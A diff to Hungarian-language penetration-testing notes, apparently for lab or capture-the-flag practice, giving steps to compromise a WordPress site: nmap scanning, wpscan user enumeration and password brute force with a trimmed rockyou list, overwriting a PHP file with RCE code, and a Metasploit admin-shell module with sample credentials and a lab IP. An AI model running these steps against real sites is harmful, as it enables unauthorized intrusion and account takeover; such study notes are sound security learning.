@@ -103,10 +103,21 @@ wpscan: (!!sudo wpscan!!)
 
 jelszófájl leredukálása csak 5000 sornyira: cat /usr/share/wordlists/rockyou.txt | head -n5000 > /tmp/rockyou5000.txt
 
+
 Példa wordpress oldal feltörésre:
  -nmap -sS -sV <ip>
  -wpscan --url <url> --enumerate u/ap/at
  -wpscan --url <url> --usernames <> --passwords <>
- -keresünk php fájlt és beleírjuk az RCE CMD részét
- -RCE előfeltételei
- -bent vagyunk, python3 -c "import pty;pty.spawn('/bin/bash')" az interaktív shell-hez
+  -keresünk php fájlt és beleírjuk az RCE CMD részét (kitörölhetjük az egészet és kicserélhetjük a miénkkel)
+  -RCE előfeltételei
+  -bent vagyunk, python3 -c "import pty;pty.spawn('/bin/bash')" az interaktív shell-hez
+ VAGY
+  -msfconsole -q
+  -searh wordpress admin shell
+  -use 0 (szám változhat)
+  -!!automatikusan indít listenert!!
+  -options
+  -Required yes részeket kell megírni (ami helytelen/üres), set username admin; set password finalfantasy; set rhosts 40.0.4.10; etc.
+  -run; ha hibára fut akkor lépjünk be manuálisan és erősítsük meg az emailt, majd próbáljuk újra (vagy lehet hiba ha rossz jogosultságú fiókkal akarunk belépni)
+  -innentől bent vagyunk
+  -shell parancs csinál shell-t, python3 -c "import pty;pty.spawn('/bin/bash')" csinál ebből interaktívat
